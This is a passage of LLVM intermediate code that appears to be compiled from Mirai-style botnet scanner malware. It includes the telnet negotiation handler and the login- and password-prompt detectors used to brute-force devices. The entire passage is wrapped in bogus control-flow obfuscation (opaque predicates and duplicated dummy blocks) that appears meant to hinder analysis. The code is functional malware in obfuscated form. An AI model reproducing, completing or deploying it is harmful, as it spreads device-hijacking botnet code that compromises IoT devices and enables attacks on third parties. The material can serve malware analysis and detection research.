  %91 = load i32, i32* %3, align 4
  %92 = add nsw i32 %91, 2
  store i32 %92, i32* %3, align 4
  br label %11

; <label>:93:                                     ; preds = %82
  %94 = load i8*, i8** %4, align 8
  %95 = getelementptr inbounds i8, i8* %94, i64 1
  %96 = load i8, i8* %95, align 1
  %97 = zext i8 %96 to i32
  %98 = icmp eq i32 %97, 253
  br i1 %98, label %99, label %145

; <label>:99:                                     ; preds = %93
  %100 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %100, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %101 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %101, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %102 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %103 = load i8*, i8** %4, align 8
  %104 = call signext i8 @can_consume(%struct.scanner_connection* %102, i8* %103, i32 2)
  %105 = icmp ne i8 %104, 0
  br i1 %105, label %107, label %106

; <label>:106:                                    ; preds = %99
  br label %297

; <label>:107:                                    ; preds = %99
  %108 = load i8*, i8** %4, align 8
  %109 = getelementptr inbounds i8, i8* %108, i64 2
  %110 = load i8, i8* %109, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp ne i32 %111, 31
  br i1 %112, label %113, label %130

; <label>:113:                                    ; preds = %107
  %114 = load i32, i32* @x.65
  %115 = load i32, i32* @y.66
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %113
  %122 = load i32, i32* @x.65
  %123 = load i32, i32* @y.66
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %146

; <label>:130:                                    ; preds = %107
  %131 = load i8*, i8** %4, align 8
  %132 = getelementptr inbounds i8, i8* %131, i64 3
  store i8* %132, i8** %4, align 8
  %133 = load i32, i32* %3, align 4
  %134 = add nsw i32 %133, 3
  store i32 %134, i32* %3, align 4
  %135 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %136 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %135, i32 0, i32 1
  %137 = load i32, i32* %136, align 8
  %138 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %139 = call i64 @send(i32 %137, i8* %138, i64 3, i32 16384)
  %140 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %141 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %140, i32 0, i32 1
  %142 = load i32, i32* %141, align 8
  %143 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %144 = call i64 @send(i32 %142, i8* %143, i64 9, i32 16384)
  br label %277

; <label>:145:                                    ; preds = %93
  br label %146

; <label>:146:                                    ; preds = %145, %originalBBpart212
  %147 = load i32, i32* @x.65
  %148 = load i32, i32* @y.66
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %146
  %155 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %156 = load i8*, i8** %4, align 8
  %157 = call signext i8 @can_consume(%struct.scanner_connection* %155, i8* %156, i32 2)
  %158 = icmp ne i8 %157, 0
  %159 = load i32, i32* @x.65
  %160 = load i32, i32* @y.66
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %158, label %184, label %167

; <label>:167:                                    ; preds = %originalBBpart216
  %168 = load i32, i32* @x.65
  %169 = load i32, i32* @y.66
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %167
  %176 = load i32, i32* @x.65
  %177 = load i32, i32* @y.66
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %297

; <label>:184:                                    ; preds = %originalBBpart216
  store i32 0, i32* %5, align 4
  br label %185

; <label>:185:                                    ; preds = %248, %184
  %186 = load i32, i32* %5, align 4
  %187 = icmp slt i32 %186, 3
  br i1 %187, label %188, label %251

; <label>:188:                                    ; preds = %185
  %189 = load i8*, i8** %4, align 8
  %190 = load i32, i32* %5, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8, i8* %189, i64 %191
  %193 = load i8, i8* %192, align 1
  %194 = zext i8 %193 to i32
  %195 = icmp eq i32 %194, 253
  br i1 %195, label %196, label %217

; <label>:196:                                    ; preds = %188
  %197 = load i32, i32* @x.65
  %198 = load i32, i32* @y.66
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %196
  %205 = load i8*, i8** %4, align 8
  %206 = load i32, i32* %5, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds i8, i8* %205, i64 %207
  store i8 -4, i8* %208, align 1
  %209 = load i32, i32* @x.65
  %210 = load i32, i32* @y.66
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %231

; <label>:217:                                    ; preds = %188
  %218 = load i8*, i8** %4, align 8
  %219 = load i32, i32* %5, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds i8, i8* %218, i64 %220
  %222 = load i8, i8* %221, align 1
  %223 = zext i8 %222 to i32
  %224 = icmp eq i32 %223, 251
  br i1 %224, label %225, label %230

; <label>:225:                                    ; preds = %217
  %226 = load i8*, i8** %4, align 8
  %227 = load i32, i32* %5, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds i8, i8* %226, i64 %228
  store i8 -3, i8* %229, align 1
  br label %230

; <label>:230:                                    ; preds = %225, %217
  br label %231

; <label>:231:                                    ; preds = %230, %originalBBpart224
  %232 = load i32, i32* @x.65
  %233 = load i32, i32* @y.66
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %231
  %240 = load i32, i32* @x.65
  %241 = load i32, i32* @y.66
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %248

; <label>:248:                                    ; preds = %originalBBpart228
  %249 = load i32, i32* %5, align 4
  %250 = add nsw i32 %249, 1
  store i32 %250, i32* %5, align 4
  br label %185

; <label>:251:                                    ; preds = %185
  %252 = load i32, i32* @x.65
  %253 = load i32, i32* @y.66
  %254 = sub i32 %252, 1
  %255 = mul i32 %252, %254
  %256 = urem i32 %255, 2
  %257 = icmp eq i32 %256, 0
  %258 = icmp slt i32 %253, 10
  %259 = or i1 %257, %258
  br i1 %259, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %251
  %260 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %261 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %260, i32 0, i32 1
  %262 = load i32, i32* %261, align 8
  %263 = load i8*, i8** %4, align 8
  %264 = call i64 @send(i32 %262, i8* %263, i64 3, i32 16384)
  %265 = load i8*, i8** %4, align 8
  %266 = getelementptr inbounds i8, i8* %265, i64 3
  store i8* %266, i8** %4, align 8
  %267 = load i32, i32* %3, align 4
  %268 = add nsw i32 %267, 3
  store i32 %268, i32* %3, align 4
  %269 = load i32, i32* @x.65
  %270 = load i32, i32* @y.66
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBBpart241, label %originalBB30alteredBB

originalBBpart241:                                ; preds = %originalBB30
  br label %277

; <label>:277:                                    ; preds = %originalBBpart241, %130
  %278 = load i32, i32* @x.65
  %279 = load i32, i32* @y.66
  %280 = sub i32 %278, 1
  %281 = mul i32 %278, %280
  %282 = urem i32 %281, 2
  %283 = icmp eq i32 %282, 0
  %284 = icmp slt i32 %279, 10
  %285 = or i1 %283, %284
  br i1 %285, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %277
  %286 = load i32, i32* @x.65
  %287 = load i32, i32* @y.66
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %294

; <label>:294:                                    ; preds = %originalBBpart245
  br label %295

; <label>:295:                                    ; preds = %294, %originalBBpart2
  br label %296

; <label>:296:                                    ; preds = %295
  br label %11

; <label>:297:                                    ; preds = %originalBBpart220, %106, %originalBBpart28, %22, %11
  %298 = load i32, i32* @x.65
  %299 = load i32, i32* @y.66
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %297
  %306 = load i32, i32* %3, align 4
  %307 = load i32, i32* @x.65
  %308 = load i32, i32* @y.66
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  ret i32 %306

originalBBalteredBB:                              ; preds = %originalBB, %23
  %315 = load i8*, i8** %4, align 8
  %316 = load i8, i8* %315, align 1
  %317 = zext i8 %316 to i32
  %318 = icmp eq i32 %317, 255
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %44
  %319 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %320 = load i8*, i8** %4, align 8
  %321 = call signext i8 @can_consume(%struct.scanner_connection* %319, i8* %320, i32 1)
  %322 = icmp ne i8 %321, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %65
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %113
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %146
  %323 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %324 = load i8*, i8** %4, align 8
  %325 = call signext i8 @can_consume(%struct.scanner_connection* %323, i8* %324, i32 2)
  %326 = icmp ne i8 %325, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %167
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %196
  %327 = load i8*, i8** %4, align 8
  %328 = load i32, i32* %5, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds i8, i8* %327, i64 %329
  store i8 -4, i8* %330, align 1
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %231
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %251
  %331 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %332 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %331, i32 0, i32 1
  %333 = load i32, i32* %332, align 8
  %334 = load i8*, i8** %4, align 8
  %335 = call i64 @send(i32 %333, i8* %334, i64 3, i32 16384)
  %336 = load i8*, i8** %4, align 8
  %337 = getelementptr inbounds i8, i8* %336, i64 3
  store i8* %337, i8** %4, align 8
  %338 = load i32, i32* %3, align 4
  %_ = sub i32 0, %338
  %gen = add i32 %_, 3
  %_31 = sub i32 %338, 3
  %gen32 = mul i32 %_31, 3
  %_33 = shl i32 %338, 3
  %_34 = sub i32 %338, 3
  %gen35 = mul i32 %_34, 3
  %_36 = sub i32 0, %338
  %gen37 = add i32 %_36, 3
  %_38 = sub i32 %338, 3
  %gen39 = mul i32 %_38, 3
  %339 = add nsw i32 %338, 3
  store i32 %339, i32* %3, align 4
  br label %originalBB30

originalBB43alteredBB:                            ; preds = %originalBB43, %277
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %297
  %340 = load i32, i32* %3, align 4
  br label %originalBB47
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_user_prompt(%struct.scanner_connection*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.scanner_connection*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %3, align 8
  store i32 -1, i32* %6, align 4
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sub nsw i32 %13, 1
  store i32 %14, i32* %5, align 4
  br label %15

; <label>:15:                                     ; preds = %99, %1
  %16 = load i32, i32* %5, align 4
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %18, label %102

; <label>:18:                                     ; preds = %15
  %19 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %19, i32 0, i32 7
  %21 = load i32, i32* %5, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [256 x i8], [256 x i8]* %20, i64 0, i64 %22
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 58
  br i1 %26, label %95, label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* @x.67
  %29 = load i32, i32* @y.68
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %27
  %36 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %37 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %36, i32 0, i32 7
  %38 = load i32, i32* %5, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds [256 x i8], [256 x i8]* %37, i64 0, i64 %39
  %41 = load i8, i8* %40, align 1
  %42 = sext i8 %41 to i32
  %43 = icmp eq i32 %42, 62
  %44 = load i32, i32* @x.67
  %45 = load i32, i32* @y.68
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %95, label %52

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %54 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %53, i32 0, i32 7
  %55 = load i32, i32* %5, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %54, i64 0, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = sext i8 %58 to i32
  %60 = icmp eq i32 %59, 36
  br i1 %60, label %95, label %61

; <label>:61:                                     ; preds = %52
  %62 = load i32, i32* @x.67
  %63 = load i32, i32* @y.68
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %61
  %70 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %71 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %70, i32 0, i32 7
  %72 = load i32, i32* %5, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [256 x i8], [256 x i8]* %71, i64 0, i64 %73
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = icmp eq i32 %76, 35
  %78 = load i32, i32* @x.67
  %79 = load i32, i32* @y.68
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %77, label %95, label %86

; <label>:86:                                     ; preds = %originalBBpart24
  %87 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %88 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %87, i32 0, i32 7
  %89 = load i32, i32* %5, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds [256 x i8], [256 x i8]* %88, i64 0, i64 %90
  %92 = load i8, i8* %91, align 1
  %93 = sext i8 %92 to i32
  %94 = icmp eq i32 %93, 37
  br i1 %94, label %95, label %98

; <label>:95:                                     ; preds = %86, %originalBBpart24, %52, %originalBBpart2, %18
  %96 = load i32, i32* %5, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %6, align 4
  br label %102

; <label>:98:                                     ; preds = %86
  br label %99

; <label>:99:                                     ; preds = %98
  %100 = load i32, i32* %5, align 4
  %101 = add nsw i32 %100, -1
  store i32 %101, i32* %5, align 4
  br label %15

; <label>:102:                                    ; preds = %95, %15
  %103 = load i32, i32* @x.67
  %104 = load i32, i32* @y.68
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %102
  %111 = load i32, i32* %6, align 4
  %112 = icmp eq i32 %111, -1
  %113 = load i32, i32* @x.67
  %114 = load i32, i32* @y.68
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %112, label %121, label %187

; <label>:121:                                    ; preds = %originalBBpart28
  %122 = load i32, i32* @x.67
  %123 = load i32, i32* @y.68
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %121
  call void @table_unlock_val(i8 zeroext 26)
  call void @table_unlock_val(i8 zeroext 27)
  %130 = call i8* @table_retrieve_val(i32 26, i32* %8)
  store i8* %130, i8** %9, align 8
  %131 = call i8* @table_retrieve_val(i32 27, i32* %8)
  store i8* %131, i8** %10, align 8
  %132 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %133 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %132, i32 0, i32 7
  %134 = getelementptr inbounds [256 x i8], [256 x i8]* %133, i32 0, i32 0
  %135 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %136 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %135, i32 0, i32 6
  %137 = load i32, i32* %136, align 4
  %138 = load i8*, i8** %9, align 8
  %139 = load i32, i32* %8, align 4
  %140 = sub nsw i32 %139, 1
  %141 = call i32 @util_memsearch(i8* %134, i32 %137, i8* %138, i32 %140)
  %142 = icmp ne i32 %141, -1
  %143 = zext i1 %142 to i32
  store i32 %143, i32* %7, align 4
  %144 = load i32, i32* @x.67
  %145 = load i32, i32* @y.68
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart217, label %originalBB10alteredBB

originalBBpart217:                                ; preds = %originalBB10
  br i1 %142, label %152, label %154

; <label>:152:                                    ; preds = %originalBBpart217
  %153 = load i32, i32* %7, align 4
  store i32 %153, i32* %6, align 4
  br label %186

; <label>:154:                                    ; preds = %originalBBpart217
  %155 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %156 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %155, i32 0, i32 7
  %157 = getelementptr inbounds [256 x i8], [256 x i8]* %156, i32 0, i32 0
  %158 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %159 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %158, i32 0, i32 6
  %160 = load i32, i32* %159, align 4
  %161 = load i8*, i8** %10, align 8
  %162 = load i32, i32* %8, align 4
  %163 = sub nsw i32 %162, 1
  %164 = call i32 @util_memsearch(i8* %157, i32 %160, i8* %161, i32 %163)
  %165 = icmp ne i32 %164, -1
  %166 = zext i1 %165 to i32
  store i32 %166, i32* %7, align 4
  br i1 %165, label %167, label %169

; <label>:167:                                    ; preds = %154
  %168 = load i32, i32* %7, align 4
  store i32 %168, i32* %6, align 4
  br label %169

; <label>:169:                                    ; preds = %167, %154
  %170 = load i32, i32* @x.67
  %171 = load i32, i32* @y.68
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %169
  %178 = load i32, i32* @x.67
  %179 = load i32, i32* @y.68
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br label %186

; <label>:186:                                    ; preds = %originalBBpart221, %152
  br label %187

; <label>:187:                                    ; preds = %186, %originalBBpart28
  call void @table_lock_val(i8 zeroext 26)
  call void @table_lock_val(i8 zeroext 27)
  %188 = load i32, i32* %6, align 4
  %189 = icmp eq i32 %188, -1
  br i1 %189, label %190, label %207

; <label>:190:                                    ; preds = %187
  %191 = load i32, i32* @x.67
  %192 = load i32, i32* @y.68
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %190
  store i32 0, i32* %2, align 4
  %199 = load i32, i32* @x.67
  %200 = load i32, i32* @y.68
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br label %209

; <label>:207:                                    ; preds = %187
  %208 = load i32, i32* %6, align 4
  store i32 %208, i32* %2, align 4
  br label %209

; <label>:209:                                    ; preds = %207, %originalBBpart225
  %210 = load i32, i32* %2, align 4
  ret i32 %210

originalBBalteredBB:                              ; preds = %originalBB, %27
  %211 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %212 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %211, i32 0, i32 7
  %213 = load i32, i32* %5, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds [256 x i8], [256 x i8]* %212, i64 0, i64 %214
  %216 = load i8, i8* %215, align 1
  %217 = sext i8 %216 to i32
  %218 = icmp eq i32 %217, 62
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %61
  %219 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %220 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %219, i32 0, i32 7
  %221 = load i32, i32* %5, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds [256 x i8], [256 x i8]* %220, i64 0, i64 %222
  %224 = load i8, i8* %223, align 1
  %225 = sext i8 %224 to i32
  %226 = icmp eq i32 %225, 35
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %102
  %227 = load i32, i32* %6, align 4
  %228 = icmp eq i32 %227, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %121
  call void @table_unlock_val(i8 zeroext 26)
  call void @table_unlock_val(i8 zeroext 27)
  %229 = call i8* @table_retrieve_val(i32 26, i32* %8)
  store i8* %229, i8** %9, align 8
  %230 = call i8* @table_retrieve_val(i32 27, i32* %8)
  store i8* %230, i8** %10, align 8
  %231 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %232 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %231, i32 0, i32 7
  %233 = getelementptr inbounds [256 x i8], [256 x i8]* %232, i32 0, i32 0
  %234 = load %struct.scanner_connection*, %struct.scanner_connection** %3, align 8
  %235 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %234, i32 0, i32 6
  %236 = load i32, i32* %235, align 4
  %237 = load i8*, i8** %9, align 8
  %238 = load i32, i32* %8, align 4
  %_ = sub i32 %238, 1
  %gen = mul i32 %_, 1
  %_11 = sub i32 %238, 1
  %gen12 = mul i32 %_11, 1
  %_13 = shl i32 %238, 1
  %_14 = sub i32 0, %238
  %gen15 = add i32 %_14, 1
  %239 = sub nsw i32 %238, 1
  %240 = call i32 @util_memsearch(i8* %233, i32 %236, i8* %237, i32 %239)
  %241 = icmp ne i32 %240, -1
  %242 = zext i1 %241 to i32
  store i32 %242, i32* %7, align 4
  br label %originalBB10

originalBB19alteredBB:                            ; preds = %originalBB19, %169
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %190
  store i32 0, i32* %2, align 4
  br label %originalBB23
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_pass_prompt(%struct.scanner_connection*) #0 {
  %2 = load i32, i32* @x.69
  %3 = load i32, i32* @y.70
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca %struct.scanner_connection*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  store %struct.scanner_connection* %0, %struct.scanner_connection** %11, align 8
  store i32 -1, i32* %14, align 4
  %18 = load %struct.scanner_connection*, %struct.scanner_connection** %11, align 8
  %19 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i32 0, i32 6
  %20 = load i32, i32* %19, align 4
  %21 = sub nsw i32 %20, 1
  store i32 %21, i32* %13, align 4
  %22 = load i32, i32* @x.69
  %23 = load i32, i32* @y.70
